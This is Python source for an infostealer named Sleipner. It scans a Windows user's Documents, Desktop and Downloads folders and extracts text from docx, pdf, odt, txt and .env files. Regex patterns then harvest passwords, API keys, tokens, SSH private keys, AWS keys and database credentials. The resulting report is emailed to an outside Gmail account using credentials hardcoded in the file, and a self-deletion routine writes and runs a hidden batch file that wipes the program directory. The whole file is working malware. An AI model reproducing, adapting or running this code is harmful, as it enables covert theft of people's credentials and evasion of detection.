import sys, os, random, locale, tempfile, subprocess, textwrap
import ctypes, uuid
from ctypes import wintypes
from pathlib import Path
import smtplib
from email.message import EmailMessage
import json

SAFE_MODE = True

TARGET_FILETYPES = [
    "docx", 
    "txt", 
    "pdf", 
    "odt", 
    "env"
    ]

TARGET_CATEGORIES = [
    "credentials",
    "unknown"
]

LANGDETECT_TO_NLTK_NAME = {
    'da': 'danish',
    'nl': 'dutch',
    'en': 'english',
    'fi': 'finnish',
    'fr': 'french',
    'de': 'german',
    'el': 'greek',
    'it': 'italian',
    'no': 'norwegian',
    'pt': 'portuguese',
    'ro': 'romanian',
    'ru': 'russian',
    'es': 'spanish',
    'sv': 'swedish',
    'tr': 'turkish',
}

class SleipnerAgent:
    def __init__(self):
        self.load_keywords()
        self.potential_targets = None
        self.lantern = Lantern()
        self.first_round_results = []
        self.final_results = []
        self.report = None

    def launch(self):
        if self._install_local_modules():

            self.determine_system_language_v2()
            self.enviroment_directory_paths = self.determine_system_directory()

            self._scan_files(self.enviroment_directory_paths)
            print(f"{len(self.potential_targets)} files found.")

            self._analyze_files()
            self.run_result_analytics()
            self.send_results()
            
            # WARNING - DO NOT RUN THIS FUNCTION, IT WILL WIPE THE DIRECTORY
            # self.self_destruct()

        else:
            self.send_results()

    def load_keywords(self, path="categorizer_db.json"):
        with open(path, "r", encoding="utf-8") as f:
            self.keyword_map = json.load(f)

    def _install_local_modules(self) -> bool:
        ###################
        ##  INSTALL NLTK ##
        ###################
        sys.path.insert(0, os.path.abspath("./libs"))
        try:
            import nltk
            from nltk.tokenize import word_tokenize, sent_tokenize
            from nltk.corpus import stopwords
            from nltk.classify import NaiveBayesClassifier

            nltk_data_path = os.path.abspath("./nltk_data")
            nltk.data.path.append(nltk_data_path)

            if not os.path.exists(os.path.join(nltk_data_path, "tokenizers", "punkt")):
                nltk.download("punkt", quiet=True, download_dir=nltk_data_path)
            if not os.path.exists(os.path.join(nltk_data_path, "corpora", "stopwords")):
                nltk.download("stopwords", quiet=True, download_dir=nltk_data_path)
            if not os.path.exists(os.path.join(nltk_data_path, "tokenizers", "punkt_tab")):
                nltk.download("punkt_tab", quiet=True, download_dir=nltk_data_path)

            self.word_tokenize = word_tokenize
            self.sent_tokenize = sent_tokenize
            self.stopwords = stopwords.words("english")

            print("Successfully imported NLTK.")

        except ImportError:
            print("NLTK not found.")
            return False
        
        
        #########################
        ##  INSTALL LANGDETECT ##
        #########################
        try:
            from langdetect import detect, DetectorFactory, LangDetectException
            DetectorFactory.seed = 42
            
            print("Successfully imported langdetect.")
        except ImportError:
            print("langdetect not found in ./libs")
            return False
        
        ##########################
        ##  INSTALL DOCX READER ##
        ##########################
        try:
            # First make sure packages and docx exist
            packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
            docx_path = os.path.join(packages_path, 'docx')
            
            if not os.path.exists(docx_path):
                print(f"docx module not found at expected path: {docx_path}")
                return False
                
            # Make sure packages dir is in path
            if packages_path not in sys.path:
                sys.path.insert(0, packages_path)
                
            # Try importing with specific path handling
            import docx
            self.docx = docx
            print(f"Successfully imported python-docx.")
            
        except ImportError as e:
            print(f"Failed to import python-docx: {e}")
            
   
        ##########################
        ##  INSTALL PDF READER  ##
        ##########################
        try:
            # First make sure packages and PyPDF2 exist
            packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
            pypdf2_path = os.path.join(packages_path, 'PyPDF2')
            
            if not os.path.exists(pypdf2_path):
                print(f"PyPDF2 module not found at expected path: {pypdf2_path}")
                return False
                
            # Make sure packages dir is in path
            if packages_path not in sys.path:
                sys.path.insert(0, packages_path)
                
            # Try importing with specific path handling
            import PyPDF2
            self.pypdf2 = PyPDF2
            print(f"Successfully imported PyPDF2.")
                        
        except ImportError as e:
            print(f"Failed to import PyPDF2: {e}")
            
        # INSTALL DEFUSEDXML
        try:
            defused_path = os.path.join(packages_path, 'defusedxml')
            if not os.path.exists(defused_path):
                print(f"defusedxml not found at expected path: {defused_path}")
                return False

            if packages_path not in sys.path:
                sys.path.insert(0, packages_path)

            import defusedxml
            print("Successfully imported defusedxml.")
        except ImportError as e:
            print(f"Failed to import defusedxml: {e}")
            return False
            
        ##########################
        ##  INSTALL ODF READER  ##
        ##########################
        try:
            odf_path = os.path.join(packages_path, 'odf')
            
            if not os.path.exists(odf_path):
                print(f"odf module not found at expected path: {odf_path}")
                return False

            if packages_path not in sys.path:
                sys.path.insert(0, packages_path)

            import odf

            self.odf = odf
            print(f"Successfully imported odf.")

        except ImportError as e:
            print(f"Failed to import odf: {e}")
            
        return True
        
    def give_agent_language_knowledge(self, language_code: str) -> bool:
        """
        Load stopwords and punkt tokenizer for the user's language (in addition to English).
        Return True if successful.
        """
        import nltk
        from nltk.corpus import stopwords

        nltk_data_path = os.path.abspath("./nltk_data")
        nltk.data.path.append(nltk_data_path)

        lang_name = LANGDETECT_TO_NLTK_NAME.get(language_code)
        if not lang_name:
            return False

        try:
            self.user_stopwords = stopwords.words(lang_name)
            self.user_language = lang_name
            
            try:
                self.user_sent_tokenize = nltk.data.load(f"tokenizers/punkt/{lang_name}.pickle").tokenize
            except LookupError:
                self.user_sent_tokenize = self.sent_tokenize
            return True
        
        except Exception as e:
            print(f"Could not load stopwords for {lang_name}: {e}")
            return False
        
    def is_meaningful_filename(self, name: str) -> bool:
        clean = name.lower().strip()

        # Filter out names with less than three symbols
        if len(clean) < 3:
            return False

        # Filter out shit like '123456789-123'
        if all(c.isdigit() or c in "-_" for c in clean):
            return False

        return True

    def determine_system_language(self) -> str:
        """
        Analyze filenames to determine which language is used in the majority of times
        to name files by the user. (English is not counted.)
        1. Take 50 random files, analyze and count language of filenaming.
        2. Do this 5 times over to recieve 5 'top languages'.
        3. If one language is not >80% of 'top languages', rerun.
        """
        
        
        filetypes = [
            "docx", 
            "pdf", 
            "odt", 
            ]
        
        self._scan_files('Documents', filetypes)
        self._analyze_files()

        top_language = {
            "Language": "Undefined",
            "Occurences": 0
            }
        
        n = 1
        # Continue analyzing until 80% accuracy
        while top_language["Occurences"] < 4 and n <= 5:
            n += 1

            top_sample_language = []

            # Five turns of 50 filename samples
            for _ in range(5):
                file_sample = random.sample(self.potential_targets, 5)

                found_languages = []

                # Clean up filename and analyze language used; add it to list
                for filename in file_sample:
                    print(filename)
                    filename_dir_cleaned = filename.split("\\")[-1]
                    filename_final_cleaned = filename_dir_cleaned.rsplit(".", 1)[0]

                    if not self.is_meaningful_filename(filename_final_cleaned):
                        continue  # skip junk

                    try:
                        language = detect(filename_final_cleaned)
                        found_languages.append(language)
                    except Exception:
                        continue

                    

                    # print(f"Filename: {filename_final_cleaned}. Language: {language}.")

                all_languages_present = set(found_languages)
                all_languages_present.discard("en")
                if not all_languages_present:
                    continue

                counted_languages = {}

                # Count how often each found language is used in the pool of 50 filenames
                for language in all_languages_present:
                    occurences = found_languages.count(language)
                    counted_languages[language] = occurences
                
                # print(counted_languages)

                most_common_language = max(counted_languages, key=counted_languages.get)
                top_sample_language.append(most_common_language)

            top_languages = set(top_sample_language)
            
            # Extract the most used language (except for english)
            for language in top_languages:
                if top_sample_language.count(language) > top_language["Occurences"]:
                    top_language["Language"] = language
                    top_language["Occurences"] = top_sample_language.count(language)

        return top_language["Language"]
    
    def determine_system_language_v2(self) -> str:
        
        lang_code, _ = locale.getdefaultlocale()
        print(f"System language: {lang_code}")

        return lang_code
    
    def determine_system_directory(self):
        """
        Scan the system and create a dictionary with windows paths for documents, desktop and downloads folders.
        """
        results = {}

        # Windows HRESULT is just a 32-bit signed integer
        HRESULT = ctypes.c_long

        # Map of known folder names to their GUIDs
        _KNOWNFOLDERIDS = {
            "documents":  "FDD39AD0-238F-46AF-ADB4-6C85480369C7",
            "desktop":    "B4BFCC3A-DB2C-424C-B029-7FE99A87C641",
            "downloads":  "374DE290-123F-4565-9164-39C4925E467B",
        }

        def _get_known_folder(name: str) -> Path:
            guid_bytes = uuid.UUID(_KNOWNFOLDERIDS[name.lower()]).bytes_le
            guid_buffer = (ctypes.c_byte * 16).from_buffer_copy(guid_bytes)

            # Get a pointer to the buffer's first byte
            guid_ptr = ctypes.cast(guid_buffer, ctypes.POINTER(ctypes.c_byte))

            SHGetKnownFolderPath = ctypes.windll.shell32.SHGetKnownFolderPath
            SHGetKnownFolderPath.argtypes = [
                ctypes.POINTER(ctypes.c_byte),  # REFKNOWNFOLDERID
                wintypes.DWORD,                 # dwFlags
                wintypes.HANDLE,                # hToken
                ctypes.POINTER(ctypes.c_wchar_p)  # out PWSTR*
            ]
            SHGetKnownFolderPath.restype = HRESULT

            path_ptr = ctypes.c_wchar_p()
            hr = SHGetKnownFolderPath(guid_ptr, 0, None, ctypes.byref(path_ptr))
            if hr != 0:
                raise ctypes.WinError(hr)

            try:
                return Path(path_ptr.value)
            finally:
                ctypes.windll.ole32.CoTaskMemFree(path_ptr)

        for location in _KNOWNFOLDERIDS.keys():
            results[location] = _get_known_folder(location)

        return results

    def _read_docx(self, file_path) -> str:
        packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
        sys.path.insert(0, packages_path)

        try:
            doc = self.docx.Document(file_path)

            # print("--- NEW DOCX DOCUMENT ---")

            text_chunks = []

            # Read paragraphs
            for para in doc.paragraphs:
                paragraph_text = para.text.strip()
                if paragraph_text:
                    # print(paragraph_text)
                    text_chunks.append(paragraph_text)

            # Read tables
            if doc.tables:
                # print("\n--- Tables ---\n")
                for i, table in enumerate(doc.tables):
                    # print(f"Table {i+1}:")
                    for row in table.rows:
                        row_text = [cell.text.strip() for cell in row.cells if cell.text.strip()]
                        if row_text:
                            joined_row = " | ".join(row_text)
                            # print(joined_row)
                            text_chunks.append(joined_row)
                    # print("")

            return "\n".join(text_chunks)

        except Exception as e:
            print(f"Error reading document: {str(e)}")
            return ""

    def _read_pdf(self, file_path) -> str:
        packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
        sys.path.insert(0, packages_path)

        try:
            with open(file_path, 'rb') as f:
                reader = self.pypdf2.PdfReader(f)

                # print("--- NEW PDF DOCUMENT ---")

                text = ""
                for i, page in enumerate(reader.pages):
                    page_text = page.extract_text()
                    if page_text:
                        # print(f"Page {i+1}:\n{page_text.strip()}\n")
                        text += page_text + "\n"

                return text.strip()

        except Exception as e:
            print(f"Error reading PDF: {str(e)}")
            return ""

    def _read_odt(self, file_path) -> str:
        packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
        sys.path.insert(0, packages_path)

        try:
            from odf.opendocument import load
            from odf.text import P
            from odf.element import Node

            def extract_text_recursive(element: Node) -> str:
                text_parts = []
                for child in element.childNodes:
                    if hasattr(child, 'data') and child.data:
                        text_parts.append(child.data)
                    else:
                        text_parts.append(extract_text_recursive(child))
                return ''.join(text_parts)

            doc = load(file_path)
            paragraphs = doc.getElementsByType(P)

            # print("--- NEW ODT DOCUMENT ---")

            text = ""
            for para in paragraphs:
                paragraph_text = extract_text_recursive(para).strip()
                if paragraph_text:
                    # print("PARAGRAPH:", paragraph_text)
                    text += paragraph_text + "\n"

            # print("FULL TEXT:")
            # print(text)
            return text.strip()

        except Exception as e:
            print(f"Error reading ODT file: {str(e)}")
            return ""

    def _read_env(self, file_path) -> str:
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                lines = f.readlines()

            env_lines = []
            # print("--- NEW ENV FILE ---")
            for line in lines:
                stripped = line.strip()
                if not stripped or stripped.startswith("#"):
                    continue  # skip empty lines and comments
                # print(stripped)
                env_lines.append(stripped)

            return "\n".join(env_lines)

        except Exception as e:
            print(f"Error reading .env file: {str(e)}")
            return ""

    def _read_txt(self, file_path) -> str:
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()

            # print("--- NEW TXT FILE ---")
            # print(content)
            return content.strip()

        except Exception as e:
            print(f"Error reading .txt file: {str(e)}")
            return ""

    def _scan_files(self, directory_paths, directory=None, filetypes=None):
        # Get all wanted text files in the system
        self.potential_targets = self.lantern.sense_surroundings(directory_paths, directory, filetypes)

    def classify_with_keywords(self, content: str, lang_code: str) -> str:
        tokens = set(self.word_tokenize(content.lower()))
        best_category = None
        best_score = 0

        for category, langs in self.keyword_map.items():
            keywords = langs.get(lang_code) or langs.get("en", [])  # fallback to English
            score = sum(1 for word in tokens if word in keywords)

            if score > best_score:
                best_score = score
                best_category = category

        return best_category or "unknown"

    def _analyze_files(self):
        from langdetect import detect, LangDetectException

        if not self.potential_targets:
            self._scan_files()

        n = 1
        for filepath in self.potential_targets:
            # if n < 10:

                # print("CURRENT FILE:", filepath)
                # print(filepath)
                filetype = filepath.split(".")[-1]
                
                match filetype:
                    case "docx":
                        content = self._read_docx(filepath)
                    case "pdf":
                        content = self._read_pdf(filepath)
                    case "odt":
                        content = self._read_odt(filepath)
                    case "env":
                        content = self._read_env(filepath)

                        # Always save .env content
                        results_entry = filepath + "\n" + content
                        self.first_round_results.append(results_entry)
                        
                    case "txt":
                        content = self._read_txt(filepath)
                    case _: 
                        content = "Unable to read document."

                if content and content.strip() and filetype != "env":
                    try:
                        language = detect(content)
                        # print(f"[{filepath}] Detected language: {language}")
                    except LangDetectException:
                        print(f"[{filepath}] Language could not be detected.")

                    try:
                        category = self.classify_with_keywords(content, language)
                        # print(f"[{filepath}] → Category: {category} (Lang: {language})")

                        if category in TARGET_CATEGORIES:
                            # print("Targets found.")
                            results_entry = filepath + "\n" + content
                            self.first_round_results.append(results_entry)

                    except Exception as e:
                        print(f"[{filepath}] could not be categorized. Reason: {e}")
                else:
                    print(f"[{filepath}] No readable content.")

                n += 1    

        print(f"INITIAL ANALYSIS COMPLETE - {len(self.first_round_results)} TARGET FILES FOUND.")

    def run_result_analytics(self):
        if len(self.first_round_results) >= 1:
            print(f"Starting detailed analysis of {len(self.first_round_results)} target files...")
            
            # Define regex patterns for common credential formats
            import re
            patterns = {
                'api_key': r'(?i)(api[_-]?key|access[_-]?key|secret[_-]?key)[=:]\s*[\'"]*([a-zA-Z0-9_\-\.]{16,64})[\'"]*',
                'password': r'(?i)(password|passwd|pwd)[=:]\s*[\'"]*([^\'"\s]{8,64})[\'"]*',
                'token': r'(?i)(token|auth[_-]?token|bearer)[=:]\s*[\'"]*([a-zA-Z0-9_\-\.]{8,64})[\'"]*',
                'ssh_key': r'(?i)(BEGIN\s+(?:RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY)',
                'aws_key': r'(?i)(AKIA[0-9A-Z]{16})',
                'email_password': r'(?i)(email|mail)[_-]?(password|pwd)[=:]\s*[\'"]*([^\'"\s]{8,64})[\'"]*',
                'database_credentials': r'(?i)(db_|database_|mysql_|postgres_)(user|username|password|pwd)[=:]\s*[\'"]*([^\'"\s]{3,64})[\'"]*'
            }
            
            for entry in self.first_round_results:
                try:
                    # Split entry into filepath and content
                    filepath, content = entry.split("\n", 1)
                    
                    # Initialize dictionary to store findings for this file
                    findings = {
                        'filepath': filepath,
                        'credentials_found': [],
                        'language': None,
                        'summary': ""
                    }
                    
                    # Detect language
                    try:
                        from langdetect import detect
                        findings['language'] = detect(content)
                    except Exception as e:
                        findings['language'] = "unknown"
                        print(f"Language detection failed for {filepath}: {e}")
                    
                    # Get appropriate keyword list based on detected language
                    language = findings['language']
                    keywords = self.keyword_map.get("credentials", {}).get(language, self.keyword_map["credentials"]["en"])

                    
                    # Count keyword matches
                    keyword_count = 0
                    for keyword in keywords:
                        if re.search(rf'\b{re.escape(keyword)}\b', content, re.IGNORECASE):
                            keyword_count += 1
                    
                    # Only process files with sufficient keyword matches
                    if keyword_count >= 1:
                        # Try to tokenize content for better analysis
                        try:
                            sentences = self.sent_tokenize(content)
                        except:
                            sentences = content.split('\n')
                        
                        # Look for credential patterns in each sentence/line
                        for sentence in sentences:
                            for pattern_name, pattern in patterns.items():
                                matches = re.findall(pattern, sentence)
                                if matches:
                                    for match in matches:
                                        # Handle tuple or string match depending on regex capture groups
                                        if isinstance(match, tuple):
                                            credential_value = match[1] if len(match) > 1 else match[0]
                                        else:
                                            credential_value = match
                                        
                                        
                                        
                                        findings['credentials_found'].append({
                                            'type': pattern_name,
                                            'context': sentence.strip(),
                                            'masked_value': credential_value
                                        })
                        
                        # Process environment variables specially
                        if filepath.endswith('.env'):
                            for line in content.split('\n'):
                                if '=' in line and not line.strip().startswith('#'):
                                    key, value = line.split('=', 1)
                                    if any(keyword.lower() in key.lower() for keyword in keywords):
                                        # Mask the value
                                        if len(value) > 8:
                                            masked_value = value[:4] + '*' * (len(value) - 8) + value[-4:]
                                        else:
                                            masked_value = '****'
                                        
                                        findings['credentials_found'].append({
                                            'type': 'environment_variable',
                                            'context': line.strip(),
                                            'masked_value': masked_value
                                        })
                    
                    # Generate summary if credentials were found
                    if findings['credentials_found']:
                        findings['summary'] = f"Found {len(findings['credentials_found'])} credential(s) in {filepath}"
                        self.final_results.append(findings)
                
                except Exception as e:
                    print(f"Error analyzing {filepath if 'filepath' in locals() else 'unknown file'}: {e}")
            
            print(f"FINAL ANALYSIS COMPLETE - {len(self.final_results)} FILES CONTAIN CREDENTIALS.")
            
            # Optional: Generate a report
            if self.final_results:
                self._generate_report()
        
    def _generate_report(self):
        """Generate a summary report of all credentials found"""
        
        report = "CREDENTIAL ANALYSIS REPORT\n"
        report += "=" * 50 + "\n\n"
        
        for result in self.final_results:
            report += f"File: {result['filepath']}\n"
            report += f"Language: {result['language']}\n"
            report += f"Credentials found: {len(result['credentials_found'])}\n"
            report += "-" * 40 + "\n"
            
            for i, cred in enumerate(result['credentials_found'], 1):
                report += f"  {i}. Type: {cred['type']}\n"
                report += f"     Value: {cred['masked_value']}\n"
                context = cred['context']
                # Truncate context if too long
                if len(context) > 100:
                    context = context[:97] + "..."
                report += f"     Context: {context}\n\n"
            
            report += "\n"

        self.report = report

    def send_results(self) -> bool:

        if self.report:
            to_email = "noreply.friedman@gmail.com"
            from_email = "noreply.friedman@gmail.com"
            password = "tswa olbf fsyq intc"

            body = self.report

            msg = EmailMessage()
            msg["From"] = from_email
            msg["To"] = to_email
            msg["Subject"] = "SLEIPNER - Results"
            msg.set_content(body)

            try:
                with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
                    smtp.starttls()
                    smtp.login(from_email, password)
                    smtp.send_message(msg)
                    print("Results sent.")

                    return True
                
            except Exception as e:
                print(f"Failed to send email: {e}")
                return False
            

        else:
            "No valuable results found, no email sent."

    def self_destruct(self):

        if SAFE_MODE:
            print("#######################################################")
            print("SAFE MODE IS ENABLED, PROGRAM HAS NOT SELF DESTRUCTED")
            print("EDIT THE SAFE_MODE VARIABLE TO ENABLE SELF DESTRUCT")
            print("#######################################################")

        
        else:
            #  Find program path
            program_dir = os.path.dirname(os.path.abspath(sys.argv[0]))

            # Batch file in %TEMP%
            bat_path = os.path.join(tempfile.gettempdir(), "self_delete.bat")

            batch = textwrap.dedent(f"""\
                @echo off
                timeout /t 3 >nul

                cd /d %temp%

                for /l %%i in (1,1,30) do (
                    if not exist "{program_dir}" goto done
                    rmdir /s /q "{program_dir}" 2>nul
                    if exist "{program_dir}" timeout /t 1 >nul
                )
                :done
                del "%~f0" 2>nul
            """)

            with open(bat_path, "w", encoding="utf-8") as bat:
                bat.write(batch)

            # Start the batch file hidden & detached so it outlives the program
            creationflags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
            subprocess.Popen(["cmd", "/c", bat_path], creationflags=creationflags)

            # Leave the folder so it isn’t held open, then quit
            os.chdir(tempfile.gettempdir())
            sys.exit(0)

class Lantern:
    """
    Lantern scans all wanted files in the enviroment and returns
    them in a list as potential target files.
    """
    def __init__(self):
        self.wanted_filetypes = TARGET_FILETYPES

    def _shine_lantern(self, directory_paths, directory=None, filetypes=None) -> list:
        """
        Scans target directories for files matching self.wanted_filetypes.
        Uses resolved system paths from self.enviroment_directory_paths.
        Skips files that are too large (> MAX_FILESIZE_MB).
        """

        self.enviroment_directory_paths = directory_paths
        self.wanted_filetypes = filetypes or TARGET_FILETYPES
        MAX_FILESIZE_MB = 5  # You can later promote this to self.max_file_size_mb

        if directory:
            root_locations = [os.path.join(os.path.expanduser("~"), directory)]
        else:
            root_locations = list(self.enviroment_directory_paths.values())

        candidate_files = []

        for location in root_locations:
            location = str(location)  # Ensure string path
            if not os.path.exists(location):
                continue

            for root, _, filenames in os.walk(location):
                path_parts = os.path.normpath(root).split(os.sep)
                if 'venv' in path_parts:
                    continue  # Skip virtual environments

                for f in filenames:
                    if "." not in f:
                        continue

                    ext = f.rsplit(".", 1)[-1].lower()
                    if ext not in self.wanted_filetypes:
                        continue

                    full_path = os.path.join(root, f)
                    try:
                        size_bytes = os.path.getsize(full_path)
                        if size_bytes > MAX_FILESIZE_MB * 1024 * 1024:
                            print(f"[SKIPPED - TOO LARGE] {full_path} ({size_bytes / 1024 / 1024:.2f} MB)")
                            continue
                    except Exception as e:
                        print(f"[ERROR SIZE CHECK] {full_path}: {e}")
                        continue

                    candidate_files.append(full_path)

        return candidate_files

    
    def sense_surroundings(self, directory_filepaths, directory=None, filetypes=None) -> list:
        relevant_content = self._shine_lantern(directory_filepaths, directory, filetypes)
        return relevant_content